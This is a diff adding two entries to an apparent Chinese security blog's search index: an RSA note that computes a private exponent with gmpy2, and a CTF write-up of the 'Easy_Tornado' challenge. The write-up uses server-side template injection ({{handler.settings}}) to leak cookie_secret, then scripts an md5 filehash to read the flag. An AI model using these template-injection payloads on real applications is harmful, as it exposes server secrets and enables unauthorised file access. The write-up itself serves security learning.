@@ -851,4 +851,107 @@ let's do it<br />
         <tag>ret2text</tag>
       </tags>
   </entry>
+  <entry>
+    <title>RSA-1</title>
+    <url>/RSA-1/</url>
+    <content><![CDATA[<p>N: 模数  p&amp;q: 大整数 N 的两个因子  e&amp;d: 互为模反数的两个指数  c 是密文 m 是明文<br />
+ {N,e} 成为公钥，{N,d} 称为私钥；</p>
+<p><a id="more"></a></p>
+<h2 id="使用python脚本"><a class="anchor" href="#使用python脚本">#</a> 使用 python 脚本</h2>
+<p><img data-src="https://i.loli.net/2021/08/16/CmQPilRKHvqTc67.png" alt="f.png" title="已知p,q,e,获取d" /></p>
+<p>对于 RSA 解密有专门的 python 脚本</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre>p<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">447685307</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>q<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">2037</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>e<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>phi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 d 的值为 53616899001<br />
+<img data-src="https://i.loli.net/2021/08/16/xO4qAIwC6UD3luG.png" alt="3333.png" /></p>
+<h2 id="关于gmpy2模块"><a class="anchor" href="#关于gmpy2模块">#</a> 关于 gmpy2 模块</h2>
+<p>电脑上之前没有安装过 gmpy2 模块的用户可能会遇到这种情况</p>
+<p><img data-src="https://i.loli.net/2021/08/16/PThL6aACnRY5td7.png" alt="微信图片_20210816211029.png" /></p>
+<p>首先，我们需要给 py 先装上 wheel</p>
+<p><img data-src="https://i.loli.net/2021/08/16/hzRIqs1lbSN9Km5.png" alt="微信截图_20210816211056.png" /></p>
+<p>并且确定对一下自己的 python 版本，我的就是 python39；后面会用到。</p>
+<p>下载 python 包的网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cubGZkLnVjaS5lZHUvfmdvaGxrZS9weXRob25saWJzLw==">点我</span><br />
+这里我们选择对应的版号，download.</p>
+<p><img data-src="https://i.loli.net/2021/08/16/spEnB9GlyJ7M4o5.png" alt="3.png" /></p>
+<p><img data-src="https://i.loli.net/2021/08/16/ZCLeRtBGFrhaQnl.png" alt="微信图片_20210816210916.png" /></p>
+<p>将安装好的路径放在 'pip install' 后</p>
+<p><img data-src="https://i.loli.net/2021/08/16/ZArM8XClhSt5THe.png" alt="222.png" /></p>
+<p>大功告成啦，gmpy2 模块已经安装成功了</p>
+]]></content>
+      <categories>
+        <category>wiki</category>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>RSA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Easy_Tornado</title>
+    <url>/easy-tornado/</url>
+    <content><![CDATA[<p>Tornado：python 编写的 web 服务器兼 web 应用框架<br />
+<a id="more"></a><br />
+ 打开靶机发现有三个文件</p>
+<p><img data-src="https://i.loli.net/2021/08/17/kV1wbxNCMXKIO8F.png" alt="" /></p>
+<h3 id="flagtxt"><a class="anchor" href="#flagtxt">#</a> flag.txt</h3>
+<p><img data-src="https://i.loli.net/2021/08/17/synaCjq8xuZloKz.png" alt="" /></p>
+<h3 id="welcometxt"><a class="anchor" href="#welcometxt">#</a> welcome.txt</h3>
+<p><img data-src="https://i.loli.net/2021/08/17/emcAdbEFXkC6w71.png" alt="" /></p>
+<p><span class="green">render</span> 是 python 中的一个渲染函数 渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。</p>
+<ol>
+<li>render 方法的实质就是生成 template 模板；</li>
+<li>通过调用一个方法来生成，而这个方法是通过 render 方法的参数传递给它的；</li>
+<li>这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的 html 内容</li>
+<li>通过这三个参数，可以生成一个完整的木模板</li>
+</ol>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxNzg4Mjc1MzQvYXJ0aWNsZS9kZXRhaWxzLzgwNzkyNTE0">render 函数介绍</span><br />
+<span class="exturl" data-url="aHR0cHM6Ly93d3cua2FuY2xvdWQuY24va2FuY2xvdWQvcHl0aG9uLWJhc2ljLzQxNzEy">模板 self.render</span></p>
+<h3 id="hintstxt"><a class="anchor" href="#hintstxt">#</a> hints.txt</h3>
+<p><img data-src="https://i.loli.net/2021/08/17/Az9GROsw2kftaC3.png" alt="" /></p>
+<h3 id="get-cookie_secret"><a class="anchor" href="#get-cookie_secret">#</a> Get cookie_secret</h3>
+<p>由 flag.txt 知 filename=/fllllllllllllag，现在只要知道 cookie_secret 是多少就能写 payload 拿取 flag.</p>
+<p>由已知 3 个文件格式推测 payload 格式可能为</p>
+<p>file?filename=/fllllllllllllag&amp;filehash=xxxxxxx</p>
+<p>我先随便输入一个尝试一下，测试完后发现有 error 界面，还有 /error?msg=Error</p>
+<p><img data-src="https://i.loli.net/2021/08/17/zDTuoICG6twxUep.png" alt="" /></p>
+<p>见识不够，看了 wp 知道是服务端模板注入攻击 SSTI</p>
+<pre><code>/error?msg=&#123;&#123;23333&#125;&#125;
+</code></pre>
+<p><img data-src="https://i.loli.net/2021/08/17/MDNxlvw6S5CcaT3.png" alt="" /><br />
+界面回显也是 23333. 那肯定是要我们在双括号中键入什么了</p>
+<p>之前遇见过一次 SSTI 所以知道双括号应该是固定的写法，但至于为什么没有深究，在<span class="exturl" data-url="aHR0cHM6Ly93d3cudG9ybmFkb3dlYi5vcmcvZW4vbGF0ZXN0L3RlbXBsYXRlLmh0bWw="> Tornado 官方文档</span>中看到<br />
+模板表达式被双花括号包围；内容可以是任何 python 表达式，它将根据当前的自动转义设置进行转义并插入到输出中。其他模板指令使用.</p>
+<pre><code>&#123;&#123; ... &#125;&#125;&#123;% %&#125;&#123;# ... #&#125;（jinjia2语法）
+</code></pre>
+<p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染，</p>
+<pre><code>即：&#123;&#123;&#125;&#125;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#123;&#123;&#125;&#125;包裹的内容当做变量解析替换。比如&#123;&#123;1+1&#125;&#125;会被解析成2.因此才有了现在的模板注入漏洞.类似于SQL注入的漏洞
+</code></pre>
+<p>关于 SSTI 引发的真正原因是：render_template 渲染函数的问题</p>
+<p>cookie_secret 在 Application 对象 settings 属性中 另外 self.application.settings 有一个别名</p>
+<pre><code>RequestHandler.settings
+
+An alias for self.application.settings.
+</code></pre>
+<p><img data-src="https://i.loli.net/2021/08/17/pmKweW9VqLl2hG5.png" alt="" /></p>
+<p>handler 指向 RequestHandler (封装对请求处理的所有信息和处理方法)</p>
+<p>而 RequestHandler.settings 又指向 self.application.settings</p>
+<p>于是所有 handler.settings 就指向 RequestHandler.application.settings 了！</p>
+<pre><code>/error?msg=&#123;&#123;handler.settings&#125;&#125;
+</code></pre>
+<p><img data-src="https://i.loli.net/2021/08/17/74VYO3Sni9g8wjJ.png" alt="" /></p>
+<p>得到 cookie_secret:036cc74f-81bc-4583-9f02-e7cdb12cfa7c</p>
+<h3 id="编写python脚本计算filehash值"><a class="anchor" href="#编写python脚本计算filehash值">#</a> 编写 python 脚本计算 filehash 值</h3>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">return</span> md5</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">filehash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	filename <span class="token operator">=</span> <span class="token string">'/fllllllllllllag'</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	cookie_secret <span class="token operator">=</span> <span class="token string">'036cc74f-81bc-4583-9f02-e7cdb12cfa7c'</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	filehash<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>filehash=bd130d4511c341d7397c50a7f1f10c77</p>
+<p>payload</p>
+<pre><code>file?filename=/fllllllllllllag&amp;filehash=bd130d4511c341d7397c50a7f1f10c77
+</code></pre>
+<p><img data-src="https://i.loli.net/2021/08/17/HCf6wXzMm1a4vE3.png" alt="" /></p>
+<p>得到 flag</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
 </search>
